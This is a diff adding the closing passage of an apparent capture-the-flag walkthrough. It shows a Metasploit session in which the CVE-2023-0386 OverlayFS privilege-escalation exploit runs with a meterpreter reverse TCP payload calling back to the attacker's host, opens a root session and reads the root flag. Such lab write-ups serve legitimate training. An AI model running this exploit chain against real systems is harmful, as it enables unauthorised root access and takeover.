@@ -284,3 +284,52 @@ Active sessions
 ```
 
 Once we have this session, we have go ahead and use the `OverlayFS` exploit.
+```
+[msf](Jobs:0 Agents:1) auxiliary(scanner/ssh/ssh_login) >> use 6
+[*] Using configured payload linux/x64/meterpreter_reverse_tcp
+msf](Jobs:0 Agents:1) exploit(linux/local/cve_2023_0386_overlayfs_priv_esc) >> set session 1
+session => 1
+[msf](Jobs:0 Agents:1) exploit(linux/local/cve_2023_0386_overlayfs_priv_esc) >> set lhost 10.10.16.82
+lhost => 10.10.16.82
+[msf](Jobs:0 Agents:1) exploit(linux/local/cve_2023_0386_overlayfs_priv_esc) >> run
+[*] Started reverse TCP handler on 10.10.16.82:4444 
+[!] SESSION may not be compatible with this module:
+[!]  * Unknown session arch
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Linux kernel version found: 5.15.70
+[*] Writing '/tmp/.wF2Y3LNjne/.b6DlFC4UO2' (1121480 bytes) ...
+[*] Launching exploit...
+[+] Deleted /tmp/.wF2Y3LNjne
+[*] Meterpreter session 2 opened (10.10.16.82:4444 -> 10.10.11.221:35766) at 2025-08-28 20:32:32 -0400
+
+[msf](Jobs:0 Agents:2) exploit(linux/local/cve_2023_0386_overlayfs_priv_esc) >> sessions -i 2
+[*] Starting interaction with 2...
+
+(Meterpreter 2)(/home/admin) > cd /
+(Meterpreter 2)(/) > cd root
+(Meterpreter 2)(/root) > ls
+Listing: /root
+==============
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+020666/rw-rw-rw-  0     cha   2025-08-28 06:01:44 -0400  .bash_history
+100644/rw-r--r--  3106  fil   2021-10-15 06:06:05 -0400  .bashrc
+040700/rwx------  4096  dir   2023-06-06 06:22:34 -0400  .cache
+040755/rwxr-xr-x  4096  dir   2023-06-06 06:22:33 -0400  .cleanup
+040700/rwx------  4096  dir   2023-06-06 06:22:34 -0400  .gnupg
+040755/rwxr-xr-x  4096  dir   2023-06-06 06:22:34 -0400  .local
+020666/rw-rw-rw-  0     cha   2025-08-28 06:01:44 -0400  .mysql_history
+100644/rw-r--r--  161   fil   2019-07-09 06:05:50 -0400  .profile
+040700/rwx------  4096  dir   2023-06-06 06:22:34 -0400  .ssh
+100640/rw-r-----  33    fil   2025-08-28 06:09:59 -0400  root.txt
+040700/rwx------  4096  dir   2023-06-06 06:22:34 -0400  snap
+100644/rw-r--r--  3767  fil   2023-06-06 08:43:35 -0400  thank_you.json
+
+(Meterpreter 2)(/root) > cat root.txt
+29fb39bbb54d4c2ee6912f44d184b01d
+```
+
+And cheers 🥂, we have the root access and hence, the root flag!
+
+Good work, now treat yourself to a full bottle of that pure sweet god's nectar!! 💧💧🎉😎
